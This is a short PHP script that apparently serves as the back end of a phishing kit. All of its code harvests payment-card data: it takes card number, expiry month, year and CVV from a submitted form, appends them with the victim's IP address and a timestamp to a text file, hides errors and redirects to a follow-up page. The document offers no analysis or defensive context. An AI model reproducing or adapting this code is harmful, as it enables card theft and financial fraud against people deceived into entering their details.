<?php

date_default_timezone_set('America/Bogota');
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
$timestamp = date('d/m/Y');
$timeshour = date('h:i:s');
$file = fopen("porfavornotevayasacaer.txt", "a");
fwrite($file, "16 de tarjeta: ".$_POST['cc']."  " . PHP_EOL);
fwrite($file, "mes: ".$_POST['mes']."  " . PHP_EOL);	
fwrite($file, "ano: ".$_POST['ano']."  " . PHP_EOL);
fwrite($file, "cvv: ".$_POST['cvv']."  " . PHP_EOL);
fwrite($file, "Fecha: ".$timestamp." Hora: ".$timeshour."\nIP: ".$userp."  " . PHP_EOL);
fwrite($file, "------------------------------------------ " . PHP_EOL);
fclose($file);
header("location:last.html");

?> 